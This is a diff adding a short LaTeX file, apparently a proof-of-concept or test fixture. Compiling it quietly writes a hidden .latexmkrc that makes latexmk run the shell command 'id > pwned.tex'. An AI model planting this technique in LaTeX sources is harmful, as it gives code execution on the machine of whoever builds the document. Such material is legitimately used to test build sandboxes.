@@ -1,0 +1,8 @@
+% Writes a hidden latexmk configuration in the working directory.
+\documentclass{article}
+\newwrite\attack
+\begin{document}
+\immediate\openout\attack=.latexmkrc
+\immediate\write\attack{system("id > pwned.tex");}
+\immediate\closeout\attack
+\end{document}
